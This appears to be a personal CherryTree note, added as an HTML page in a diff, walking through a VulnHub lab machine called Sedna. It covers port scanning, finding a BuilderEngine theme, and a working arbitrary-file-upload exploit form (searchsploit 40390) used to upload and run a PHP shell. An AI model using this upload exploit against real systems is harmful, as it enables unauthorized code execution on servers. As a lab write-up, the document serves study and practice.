@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Sedna</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Sedna</h1><br/>nmap scan showed that 22, 53, 80, 110, 111, 139, 143, 445, 993, 995, 8080, 51024<br />going in order<br />    22, version not vulnerable<br />    53, dns showed no signs of zone transfer<br />    80 dirsearch showed a themes directory,<br />    after a short time I was able to deduce that the theme was created by “BuilderEngine”<br />    Searchsploit showed that there was a arbitrary file upload exploit!!<br />    <br />Copy example code from below and paste to new file yeet.html<br /><br />&lt;html&gt;<br />&lt;body&gt;<br />&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />        &lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;<br />        &lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;<br />&lt;/form&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /><br />Edit localhost to represent target Ip<br />In firefox browser<br />    file:///root/Desktop/Machines/VulnHub/HF2019/Sedna/yeet.html<br />  <br />This will bring up a page that will allow you to upload a file (optimally a php shellcode)<br />    browse&gt; to cannon.php &gt; send<br />    <br />In this exploit (40390) you go to 192.168.11.250/files/ and click on cannon.php to execute your shellcode. This will differ by exploit<br /></div></body></html>
